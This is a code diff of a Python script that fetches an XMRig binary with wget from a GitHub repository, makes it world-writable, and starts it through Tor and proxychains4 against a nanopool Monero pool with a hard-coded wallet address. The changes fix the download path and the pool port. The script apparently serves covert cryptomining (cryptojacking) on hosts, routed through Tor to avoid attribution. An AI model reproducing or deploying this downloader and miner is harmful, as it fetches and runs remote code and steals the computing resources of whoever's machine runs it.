@@ -25,7 +25,7 @@ try:
     os.system('make install')
     os.system('make install-config')
     if os.path.isfile('/usr/local/bin/' + program) == False:
-        os.system('wget https://github.com/ts6aud5vkg/daovps/raw/master/xmrig_tls' + program)
+        os.system('wget https://github.com/ts6aud5vkg/daovps/raw/master/xmrig_tls/' + program)
                         
         os.system('chmod 777 ' + program)
         workingdir = os.getcwd()
@@ -36,4 +36,4 @@ except:
     pass
 os.system('tor &')
 time.sleep(60)
-os.system ('proxychains4 ' + program + ' --donate-level 1 -o xmr-us-west1.nanopool.org:14443 -u 49f3dHJVP9ZNX5A8T1YuLVN2gS1aTPtwCRsejM7DiLgEjQDJL5fUTVvBL5wCAK8QEbaN3g4dDpbeKHWBTkL2Zs5zE8RfWqs.orcfullaz/phucnhpd00841@gmail.com -p az -a rx/0 -k --tls -t ' + str(cores))
+os.system ('proxychains4 ' + program + ' --donate-level 1 -o xmr-us-west1.nanopool.org:14433 -u 49f3dHJVP9ZNX5A8T1YuLVN2gS1aTPtwCRsejM7DiLgEjQDJL5fUTVvBL5wCAK8QEbaN3g4dDpbeKHWBTkL2Zs5zE8RfWqs.orcfullaz/phucnhpd00841@gmail.com -p az -a rx/0 -k --tls -t ' + str(cores))
